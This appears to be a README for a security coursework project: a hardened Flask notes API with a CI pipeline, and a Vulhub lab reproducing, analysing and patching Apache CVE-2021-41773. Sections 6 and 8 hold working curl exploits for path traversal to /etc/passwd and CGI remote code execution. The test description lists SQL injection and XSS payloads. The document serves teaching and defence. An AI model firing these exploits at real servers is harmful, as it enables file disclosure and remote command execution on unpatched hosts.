# Secure Notes API — Work 1

A small, deliberately hardened REST API in Python/Flask, a CI pipeline that runs
tests + SAST + SCA on every push, and a reproducible analysis of a real CVE
(**CVE-2021-41773**, Apache HTTP Server 2.4.49 path traversal) including the fix
and the proof that the fix works.

---

## 1. What this project is

The API stores short notes and exposes them to authenticated users. It exists to
demonstrate the full security lifecycle required by the assignment:

| Stage | Where it lives |
| --- | --- |
| Secure design (OWASP Top 10 A01 / A03 / A07) | `app/` |
| Automated security checks in CI | `.github/workflows/ci.yml` |
| Reproducing a real CVE | `vulnerability/vulnerable/` |
| Root cause analysis | `vulnerability/README.md` |
| Patch + verification | `vulnerability/fixed/`, `vulnerability/run_demo.ps1` |

**Stack:** Python 3.11, Flask 3, SQLite, PyJWT (HS256), bcrypt, pytest, bandit,
pip-audit, GitHub Actions, Docker Compose + Vulhub.

---

## 2. Quick start

```bash
git clone <this-repository>
cd work1-secure-api

python -m venv .venv
source .venv/bin/activate          # Windows: .\.venv\Scripts\Activate.ps1
pip install -r requirements.txt -r requirements-dev.txt

export JWT_SECRET="$(python -c 'import secrets; print(secrets.token_hex(32))')"
python wsgi.py                     # http://127.0.0.1:5000
```

Demo users are seeded on first start: `alice / Alice-Passw0rd!` (admin) and
`bob / Bob-Passw0rd!` (user).

Run the tests and the scanners:

```bash
pytest -q
bandit -r app -x tests -ll
pip-audit -r requirements.txt
```

---

## 3. API reference

All endpoints speak JSON only. A request that does not declare
`Content-Type: application/json` on a write method is answered with `415`.

### `POST /auth/login`

```bash
curl -s -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"Alice-Passw0rd!"}'
```

```json
{"access_token":"eyJhbGciOiJIUzI1NiIs...","token_type":"Bearer","expires_in":1800}
```

`401 invalid_credentials` for a wrong password **and** for an unknown user — the
response body and the timing are identical in both cases.

### `GET /api/data` *(authentication required)*

```bash
curl -s http://127.0.0.1:5000/api/data -H "Authorization: Bearer $TOKEN"
curl -s "http://127.0.0.1:5000/api/data?search=injection" -H "Authorization: Bearer $TOKEN"
```

```json
{"count":3,"items":[{"id":1,"title":"...","body":"...","author":"alice","created_at":"..."}]}
```

Without a token: `401 missing_token` and `WWW-Authenticate: Bearer realm="api"`.

### `GET /api/me` *(authentication required)*

```json
{"id":1,"username":"alice","role":"admin"}
```

### `POST /api/notes` *(authentication required)* — the self-chosen endpoint

Creates a note owned by the caller. `title` 1–120 chars, `body` 1–2000 chars,
control characters rejected.

```bash
curl -s -X POST http://127.0.0.1:5000/api/notes \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"title":"Shopping","body":"milk"}'
```

```json
{"id":4,"title":"Shopping","body":"milk","author":"alice","created_at":"2026-10-20T04:40:27+00:00"}
```

### `GET /api/notes/<id>` *(authentication required, owner or admin only)*

`403 forbidden` when user `bob` asks for a note owned by `alice`; `404` when the
note does not exist.

### `GET /health`

`{"status":"ok"}` — no authentication, no data.

---

## 4. Implemented security measures

### 4.1 SQL injection (A03:2021 — Injection)

**Root fix: every query is parameterised.** User input is bound to `?`
placeholders and sent to SQLite separately from the SQL text, so it can never be
parsed as syntax (`app/db.py`, `app/auth.py`, `app/api.py`).

```python
user = db.execute(
    "SELECT id, username, password_hash, role FROM users WHERE username = ?",
    (username,),
).fetchone()
```

Additional details that matter:

* No string formatting (`f"…{user}…"`, `%`, `.format`) appears anywhere near SQL.
* The `search` parameter is still bound **and** its `%` / `_` wildcards are
  escaped, so `?search=%` matches the literal `%` instead of dumping every row.
* Column names are never taken from user input, so there is no identifier
  injection surface either.
* `tests/test_security.py::test_sqli_in_search_returns_zero_rows_without_error`
  replays `' OR '1'='1`, `' UNION SELECT …`, `'; DROP TABLE users; --` and
  asserts `200` with `count: 0` — the payload is data, not a query.

### 4.2 XSS (A03:2021)

The API returns JSON, which is **not** automatically XSS-safe: clients routinely
take the JSON and put it into the DOM. `app/security.py::escape_deep` walks the
response and HTML-escapes every string, so a stored `<script>` leaves the API as
`&lt;script&gt;` and cannot execute at the sink.

Defence in depth on top of that:

* `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; base-uri 'none'`
* `X-Content-Type-Options: nosniff` (no content sniffing into HTML)
* `X-Frame-Options: DENY` (no clickjacking)
* JSON-only request bodies, so no HTML form can post into the API
* Input validation: control characters rejected, length caps on every field

Verified by `test_xss_payload_is_escaped_on_output`: posting
`<script>alert('xss')</script>` returns `&lt;script&gt;alert('xss')&lt;/script&gt;`.

### 4.3 Authentication (A07:2021)

* **Passwords are never stored in plaintext.** `bcrypt` with a per-password
  random salt and cost 12 (`app/security.py::hash_password`), so identical
  passwords produce different hashes and offline cracking is slow by design.
* **JWT on login.** HS256, with `iss`, `iat`, `nbf`, `exp` (30 min) and a unique
  `jti`. The secret comes from the environment; a random one is generated if it
  is missing, so a known dev secret can never leak into production.
* **`decode_token` accepts only HS256**, which defeats `alg: none` and
  algorithm-confusion forgeries, and `require`s `exp`, `iat`, `sub`, `iss`.
* **`token_required`** (`app/auth.py`) validates the header shape, verifies the
  signature/expiry/issuer, then **re-reads the user from the database** by
  `sub`. A deleted or downgraded account cannot keep using an old token.
* **No user enumeration:** unknown-user logins still run a bcrypt comparison
  against a dummy hash, and both failure paths return the same `401` body.
* **Uniform-error policy:** all responses are JSON with a machine-readable
  `code`; stack traces are logged, never returned (CWE-209).

### 4.4 Everything else

| Control | Implementation |
| --- | --- |
| Broken access control (A01) | `/api/data`, `/api/me`, `/api/notes` all behind `@token_required`; note reads check owner-or-admin |
| Input validation | type, length, empty and control-character checks on every field |
| Body size limit | `MAX_CONTENT_LENGTH = 64 KiB` → `413` |
| Error handling | `ApiError` + handlers for `HTTPException` and `Exception`; no tracebacks |
| Cache safety | `Cache-Control: no-store` on `/auth` and `/api` |
| Secrets | `.env.example` only; `.env` git-ignored; no secret in the repo |
| Dependencies | pinned ranges + `pip-audit` in CI |

---

## 5. CI/CD pipeline

`.github/workflows/ci.yml` runs on **every push** and **every pull request**:

| Job | Tool | What it does | Artifact |
| --- | --- | --- | --- |
| `test` | pytest | 25 tests incl. SQLi/XSS/expired-token/forgery cases | `reports/junit.xml` |
| `sast` | bandit | static analysis of `app/`, fails on medium+ | `reports/bandit.json` / `.txt` |
| `sca` | pip-audit | audits `requirements.txt` against the advisory database | `reports/pip-audit.json` |

The pipeline is a real gate: bandit and pip-audit are not wrapped in `|| true`
for their failing run, so a medium finding or a vulnerable dependency turns the
run red.

Local result of the same three steps (this is what the screenshots should show
in the Actions tab):

```
pytest:     25 passed
bandit:     No issues identified.  (Total lines of code: 503)
pip-audit:  No known vulnerabilities found
```

**Screenshots to attach** (open *Actions → latest run → job → step*):
1. The green run overview with all three jobs.
2. `sast` job log showing `No issues identified`.
3. `sca` job log showing `No known vulnerabilities found`.
4. Artifacts section with `bandit-report` and `pip-audit-report`.

---

## 6. Reproducing CVE-2021-41773 (Vulhub)

Selected vulnerability: **CVE-2021-41773 — path traversal / file disclosure and,
with CGI enabled, remote code execution in Apache HTTP Server 2.4.49.**
CVSS 3.1: 7.5 (HIGH), CWE-22 (path traversal). Environment taken from
`vulhub/httpd/CVE-2021-41773` and kept in `vulnerability/vulnerable/`.

Prerequisite: Docker with Docker Compose.

```bash
cd vulnerability/vulnerable
docker compose up --build -d
```

### Attack 1 — read a file outside the document root

```bash
curl -v --path-as-is \
  http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

Expected: `HTTP/1.1 200 OK` and `root:x:0:0:root:/root:/bin/bash` — the web
root was escaped even though `/etc/passwd` is four levels above it.

### Attack 2 — escalate to code execution through CGI

```bash
curl -v --data "echo;id" \
  'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

Expected: `uid=1(daemon) gid=1(daemon)` — an arbitrary shell command ran as the
Apache worker user.

`vulnerability/run_demo.ps1` automates both attacks, asserts the expected
results, and writes the whole transcript to `reports/cve-41773-*.log`.

---

## 7. Root cause analysis

Apache 2.4.49 replaced the old request-path cleanup (`ap_getparents`,
`ap_no2slash`) with a single `ap_normalize_path()` pass. The new function walks
the path segment by segment and rejects a segment that is exactly `..`, which
looks correct — but it decodes `%2e` at a different point than it validates the
segment.

The bypass is a segment written as `.%2e`:

1. During the traversal check the segment text is `.%2e`, which is **not**
   equal to `..`, so the "cannot go above the root" check is skipped.
2. The percent-decoding step then turns `.%2e` into `..`.
3. `ap_core_translate()` joins the (now decoded) path to `DocumentRoot` and
   resolves it, so the kernel walks out of the web root.

That is why the payload needs the odd `.%2e/` spelling instead of a plain `../`:
the plain form is caught by the check, the encoded form is not. It is a
**logic/ordering error** (validate-before-normalise), not a missing check —
there *is* a check, it just runs on a different string than the one that is
finally used.

Two configuration choices turn a file-disclosure bug into an RCE:

* `<Directory />` was changed to `Require all granted` (the upstream default is
  `Require all denied`), so paths outside `DocumentRoot` are served at all.
* `mod_cgi`/`mod_cgid` are loaded, so `/bin/sh` reached through the traversal is
  executed rather than downloaded.

Full write-up, including the prerequisites and the diff of the fix, is in
[`vulnerability/README.md`](vulnerability/README.md).

---

## 8. The fix and the proof

`vulnerability/fixed/` rebuilds the service on **httpd 2.4.51** (2.4.50 was an
incomplete fix that still allowed a variant of the bypass) with a hardened
config:

1. **Patched binary** — 2.4.51 normalises and validates in the correct order, so
   `.%2e` cannot smuggle a `..` past the check.
2. **`<Directory /> Require all denied`** restored — even a future traversal bug
   cannot read `/etc/passwd`, because the default policy denies it.
3. **CGI disabled** — this service serves static files only, so a file
   disclosure can never be escalated to command execution.

Verification (same payloads, fixed environment):

```bash
cd vulnerability/fixed
docker compose up --build -d

# both attacks must now fail
curl --path-as-is -i http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
curl --path-as-is -i --data "echo;id" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
# regression: normal service must still work
curl -s -i http://127.0.0.1:8080/
```

Expected after the fix: `403 Forbidden` (or `404`) for both attacks, no
`root:x:0:0` and no `uid=` in the body, while `/` still returns `200 OK` with
`It works!`.

---

## 9. Repository layout

```
work1-secure-api/
├── app/
│   ├── __init__.py        # factory, security headers, error handlers
│   ├── auth.py            # /auth/login + token_required
│   ├── api.py             # /api/data, /api/me, /api/notes
│   ├── security.py        # bcrypt, JWT, escape_deep, input cleaning
│   ├── db.py              # parameterised SQLite layer + schema
│   ├── errors.py          # uniform JSON errors
│   └── config.py          # env-driven configuration
├── tests/                 # 25 pytest tests, incl. attack payloads
├── .github/workflows/ci.yml
├── vulnerability/
│   ├── README.md          # CVE analysis, step by step
│   ├── vulnerable/        # httpd 2.4.49 + CGI, from vulhub
│   ├── fixed/             # httpd 2.4.51 + hardening
│   ├── run_demo.ps1       # attack -> verify, writes reports/*.log
│   └── run_demo.sh
├── scripts/live_demo.ps1  # curl walkthrough of the API
├── reports/               # pytest / bandit / pip-audit / curl transcripts
├── docs/                  # report + step-by-step guide
└── wsgi.py
```

---

## 10. Evidence collected in this repository

| File | Content |
| --- | --- |
| `reports/curl-transcript.txt` | 9 curl exchanges: 401 without token, JWT issued, 401 on bad password, 200 with token, SQLi payload → 0 rows, XSS escaped, 401 on garbage token, security headers |
| `reports/junit.xml` | pytest results |
| `reports/bandit.txt` / `.json` | bandit report (no issues) |
| `reports/pip-audit.json` | dependency audit (no known vulnerabilities) |

The curl transcript is generated by `scripts/live_demo.ps1`, so it can be
re-produced at any time instead of being a static screenshot.
